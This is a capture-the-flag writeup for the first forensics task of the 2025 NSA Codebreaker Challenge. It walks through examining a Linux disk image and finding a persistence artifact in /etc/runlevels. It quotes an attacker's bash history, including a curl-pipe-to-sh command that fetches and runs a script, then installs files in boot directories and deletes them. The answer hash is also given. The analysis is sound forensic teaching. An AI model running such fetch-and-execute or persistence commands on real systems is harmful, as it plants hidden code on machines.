@@ -1,0 +1,72 @@
+---
+title: "Task 1 Writeup"
+description: "A writeup for the first task of the 2025 NSA Codebreaker Challenge"
+date: 1-6-2026
+slug: nsa-cbc-2025/task1
+tags: ['writeup', 'codebreaker', 'forensics', '2025']
+authors: ["flocto"]
+image: "./hero.png"
+order: 1
+---
+import Callout from '@/components/Callout.astro'
+
+After validating ourselves in the Discord server, we get the first real task of the NSA Codebreaker Challenge.
+
+## Task 1 - Getting Started - (Forensics)
+<Callout title="Description" showVariant={false}>
+You arrive on site and immediately get to work. The DAFIN-SOC team quickly briefs you on the situation. They have noticed numerous anomalous behaviors, such as; tools randomly failing tests and anti-virus flagging on seemingly clean workstations. They have narrowed in on one machine they would like NSA to thoroughly evaluate.
+
+They have provided a zipped EXT2 image from this development machine. Help DAFIN-SOC perform a forensic analysis on this - looking for any suspicious artifacts.
+
+Downloads:
+- zipped EXT2 image (image.ext2.zip)
+
+Prompt:
+- Provide the SHA-1 hash of the suspicious artifact.
+</Callout>
+
+Downloading and unzipping the provided EXT2 image, we can mount it to analyze. I'll be using FTK Imager for this, but any tool that can read EXT2 images should work.
+
+Loading it in, we're meet with a fairly standard Linux filesystem structure. Navigating through the directories, we need to find some "suspicious artifact" to report.
+
+![Evidence Tree in FTK Imager](/img/writeups/2026/nsa-cbc/task1-ftk-tree.png)
+
+In `/root/`, we find a fairly large `.bash_history`, which we can look through to find any suspicious commands that may have been run.
+
+![Bash History in root/](/img/writeups/2026/nsa-cbc/task1-root-bashhistory.png)
+
+A lot of the commands are fairly uninteresting and look like almost normal nginx setup. However, after the server is properly setup, we get these series of commands:
+
+```sh title="Extract from .bash_history" del={"typo in rm command":10-11}
+cd /tmp
+curl http://127.0.0.1:10000/a/get.sh | sh
+tar xf t.tar
+cp c /etc/runlevels/boot/ucxvonesmr
+cp a /bin/console
+cp b /etc/runlevels/default/console
+...
+/bin/console -s -o /etc/runlevels/boot/ucxvonesmr
+...
+
+rm -f etc/runlevels/boot/ucxvonesmr
+rm -f /bin/console
+rm -f /etc/runlevels/default/console
+```
+
+This looks very suspicious, as it downloads and executes a script from localhost, extracts a tar file, and copies some files to system directories. The names of the files are also quite odd. Fortunately, whoever ran these made a typo when trying to delete the file in `/etc/runlevels/boot/`, missing the leading `/`. Everything else was cleaned up properly and is unrecoverable, at least from the disk image we have.
+
+Looking at the `ucxvonesmr` file that was copied to `/etc/runlevels/boot/`, we can see it simply defines some strange environment variables:
+
+```sh title="/etc/runlevels/boot/ucxvonesmr"
+U=/a/f98fea4ef8398f5f1c938d1b72b87971/xxyz
+P=20
+A=/app/www
+```
+
+Although we can't tell what these variables are for, they clearly are not standard system variables, so this is definitely suspicious. The file location in particular is usually not touched manually, as it is meant for initialization of system services, so this is likely the artifact we need to report.
+
+Extracting the file and calculating the SHA-1, we get the answer to submit:
+```bash ins={2}
+$ sha1sum ucxvonesmr
+3512000586a8516cb968e3d227065541adf82bfd  ucxvonesmr
+```
